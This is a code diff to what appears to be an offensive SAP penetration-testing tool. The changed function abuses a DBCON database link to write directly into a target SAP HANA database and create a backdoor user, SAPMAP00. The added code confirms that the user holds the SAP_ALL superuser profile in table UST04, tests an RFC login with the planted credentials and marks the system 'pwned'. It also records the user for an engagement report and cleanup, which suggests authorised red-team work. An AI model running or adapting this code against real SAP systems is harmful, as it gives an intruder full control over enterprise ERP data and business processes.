@@ -682,10 +682,11 @@ def create_sapmap_user_via_dbcon(edge: DBCONConnection, target_sid: str,
     templates as _execute_sql_via_gateway so behaviour matches the
     kernel-relayed path.
 
-    Returns {ok: bool, error: str, verified: bool, statements_ok: int,
-             statements_total: int}.
+    Returns {ok, error, verified, sap_all_verified, rfc_verified,
+             statements_ok, statements_total}.
     """
     result = {"ok": False, "error": "", "verified": False,
+              "sap_all_verified": False, "rfc_verified": False,
               "statements_ok": 0, "statements_total": 0}
     if edge.dbms != "HDB":
         result["error"] = (f"v1 supports HDB only, edge dbms={edge.dbms}")
@@ -729,6 +730,22 @@ def create_sapmap_user_via_dbcon(edge: DBCONConnection, target_sid: str,
     conn = None
     try:
         conn = dbapi.connect(**kwargs)
+        schema = _resolve_sap_schema(conn, target_sid=target_sid)
+        if not schema:
+            result["error"] = ("could not locate USR02 in any SAP "
+                                "schema — target may not be a real SAP DB")
+            return result
+        cur = conn.cursor()
+        try:
+            cur.execute(f'SET SCHEMA "{schema}"')
+            print(f"[*] {edge.source_sid}: DBCON {edge.con_name} — "
+                  f'SET SCHEMA "{schema}"')
+        except Exception as e:
+            result["error"] = f"SET SCHEMA failed: {type(e).__name__}: {e}"
+            return result
+        finally:
+            cur.close()
+
         for idx, sql in enumerate(sql_statements, 1):
             if sql.strip().upper() == "GO":
                 continue
@@ -768,12 +785,33 @@ def create_sapmap_user_via_dbcon(edge: DBCONConnection, target_sid: str,
         finally:
             cur.close()
 
+        # Verify: SAP_ALL profile in UST04?
+        if result["verified"]:
+            cur = conn.cursor()
+            try:
+                cur.execute(
+                    "SELECT COUNT(*) FROM UST04 "
+                    "WHERE MANDT=? AND BNAME=? AND PROFILE='SAP_ALL'",
+                    (client, sapmap_user))
+                row = cur.fetchone()
+                result["sap_all_verified"] = bool(row and int(row[0]) > 0)
+            except Exception as e:
+                print(f"[!] {edge.source_sid}: DBCON {edge.con_name} — "
+                      f"UST04 SAP_ALL verify failed: "
+                      f"{type(e).__name__}: {e}")
+            finally:
+                cur.close()
+
         result["ok"] = result["verified"]
         if result["ok"]:
             edge.pwned = True
+            sap_all_note = ("SAP_ALL confirmed in UST04"
+                            if result["sap_all_verified"]
+                            else "SAP_ALL NOT confirmed in UST04")
             print(f"[+] {edge.source_sid}: DBCON {edge.con_name} — "
                   f"SAPMAP00 created on {target_sid}/{client} via "
-                  f"direct HANA connection — verified in USR02")
+                  f"direct HANA connection — verified in USR02, "
+                  f"{sap_all_note}")
             # Record as CreatedUser on the source node so the
             # engagement report + cleanup pass see it.
             if source_node is not None:
@@ -789,6 +827,42 @@ def create_sapmap_user_via_dbcon(edge: DBCONConnection, target_sid: str,
                     ))
                 except Exception:
                     pass
+            # Best-effort RFC login verification
+            if state is not None:
+                target_node = state.get_node(target_sid)
+                if target_node and target_node.instances:
+                    try:
+                        from sapmap_config import SAPMAP_PASSWORD
+                        inst_nr = (target_node.instances[0].instance_nr
+                                   or "00").zfill(2)
+                        rfc_creds = Credentials(
+                            username=sapmap_user,
+                            password=SAPMAP_PASSWORD,
+                            client=client, instance_nr=inst_nr,
+                        )
+                        import sapmap_rfc
+                        if sapmap_rfc.test_connection(
+                                target_node, rfc_creds):
+                            result["rfc_verified"] = True
+                            print(f"[+] {edge.source_sid}: DBCON "
+                                  f"{edge.con_name} — RFC login "
+                                  f"verified for {sapmap_user} on "
+                                  f"{target_sid}/{client}")
+                        else:
+                            print(f"[*] {edge.source_sid}: DBCON "
+                                  f"{edge.con_name} — RFC login test "
+                                  f"failed (user may still work — "
+                                  f"dispatcher unreachable or SDK "
+                                  f"not loaded)")
+                    except Exception as _rfc_ex:
+                        print(f"[*] {edge.source_sid}: DBCON "
+                              f"{edge.con_name} — RFC verify "
+                              f"skipped: {type(_rfc_ex).__name__}"
+                              f": {_rfc_ex}")
+                else:
+                    print(f"[*] {edge.source_sid}: DBCON "
+                          f"{edge.con_name} — RFC verify skipped "
+                          f"(no dispatcher on {target_sid})")
         else:
             if not result["error"]:
                 result["error"] = ("SQL chain finished but USR02 "
